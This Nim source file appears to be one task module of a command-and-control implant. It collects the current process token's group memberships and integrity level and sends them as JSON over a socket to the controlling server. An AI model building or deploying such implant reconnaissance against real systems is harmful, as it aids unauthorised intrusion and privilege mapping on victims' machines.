import std/[os, net, json, jsonutils]
import ../client/[communication, modules]

proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
  let tokenGroups: seq[tuple[name, sid, domain: string]] = getintegritygroups()
  let tokenIntegrity: string = getintegrity() 
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

  taskOutput.addData(Object, "response", 
    $(%*{
      "tokenGroups": toJson tokenGroups,
      "tokenIntegrity": tokenIntegrity
    })
  )
  socket.sendOutput(taskOutput)